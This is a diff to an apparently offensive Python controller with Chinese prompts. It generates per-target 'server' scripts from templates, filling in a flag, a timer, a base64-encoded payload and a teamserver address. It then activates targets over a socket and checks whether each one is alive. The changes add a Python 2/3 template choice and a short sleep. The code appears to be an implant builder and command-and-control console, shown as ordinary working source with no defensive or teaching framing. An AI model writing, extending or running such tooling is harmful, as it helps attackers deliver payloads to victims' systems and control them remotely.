@@ -2,6 +2,7 @@ import base64
 import socket
 import json
 import argparse
+from time import sleep
 
 
 
@@ -14,20 +15,35 @@ def parse_args():
 
 
 # 以server.py为模板，生成新的文件
-def create(flag, time, payload, baseurl):
-    with open("./template/server.py", "r",encoding='utf_8') as f:
-        with open("server_"+str(flag)+".py", "w",encoding='utf_8') as g:
-            for line in f.readlines():
-                if "flag =" in line:
-                    line = "flag = \""+flag+"\"\n"
-                if "time =" in line:
-                    line = "time = "+str(time)+"\n"
-                if "payload =" in line:
-                    line = "payload = \""+payload+"\"\n"
-                if "baseurl =" in line:
-                    line = "baseurl = \""+baseurl+"\"\n"
-                g.write(line)
+def create(flag, time, payload, baseurl,version="2"):
+    if version=="3":
+        with open("./template/py3.py", "r",encoding='utf_8') as f:
+            with open("server_"+str(flag)+".py", "w",encoding='utf_8') as g:
+                for line in f.readlines():
+                    if "flag =" in line:
+                        line = "flag = \""+flag+"\"\n"
+                    if "time =" in line:
+                        line = "time = "+str(time)+"\n"
+                    if "payload =" in line:
+                        line = "payload = \""+payload+"\"\n"
+                    if "baseurl =" in line:
+                        line = "baseurl = \""+baseurl+"\"\n"
+                    g.write(line)
     #print("已在根目录生成server.py文件")
+    elif version=="2":
+        with open("./template/py2.py", "r",encoding='utf_8') as f:
+            with open("server_"+str(flag)+".py", "w",encoding='utf_8') as g:
+                for line in f.readlines():
+                    if "flag =" in line:
+                        line = "flag = \""+flag+"\"\n"
+                    if "time =" in line:
+                        line = "time = "+str(time)+"\n"
+                    if "payload =" in line:
+                        line = "payload = \""+payload+"\"\n"
+                    if "baseurl =" in line:
+                        line = "baseurl = \""+baseurl+"\"\n"
+                    g.write(line)
+        #print("已在根目录生成server.py文件")
 
 
 
@@ -75,7 +91,8 @@ def cserver():
                 payload=base64.b64encode(input("请输入payload:") .encode('utf-8')).decode('utf-8')
                 #print(payload)
                 baseurl = input("请输入teamserver的http地址，请注意端口:")
-                create(flag, time, payload, baseurl)
+                version = input("请输入python版本，2或3:")
+                create(flag, time, payload, baseurl,version)
 
                 print("本条数据已添加成功，flag为："+flag)
                 print("已生成新的server_"+flag+".py文件")
@@ -98,6 +115,7 @@ def cserver():
                 cmd2 = str(input("请输入要激活的flag\n"))
                 #cmd3 = str(cmd2)
                 sk.send(bytes(cmd2, encoding="utf_8"))
+                sleep(1)
                 ifalive=sk.recv(1024).decode()
                 if ifalive=="1":
                     print("flag为"+cmd2+"的目标已激活")
